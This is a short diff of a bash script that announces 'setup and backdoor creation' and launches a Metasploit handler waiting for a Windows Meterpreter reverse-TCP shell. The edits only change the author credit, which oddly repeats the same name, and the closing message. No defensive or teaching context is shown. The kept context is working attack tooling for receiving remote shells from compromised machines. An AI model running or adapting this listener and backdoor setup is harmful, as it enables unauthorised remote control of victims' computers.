@@ -3,7 +3,7 @@
 clear
 
 echo -e "\033[33mRunning setup and backdoor creation...\033[0m"
-echo -e "\033[34mMade by zypersploit!\033[0m"
+echo -e "\033[34mCreated by barryjensen-dev or most known as barryjensen-dev\033[0m"
 echo
 
 check_command() {
@@ -80,5 +80,6 @@ if [[ $REPLY =~ ^[Yy]$ ]]; then
 
   msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; exploit"
 
-  echo -e "\033[32mSetup complete! Listener is running...\033[0m"
+  echo -e "\033[32mGoodbye!\033[0m"
+  echo
 fi
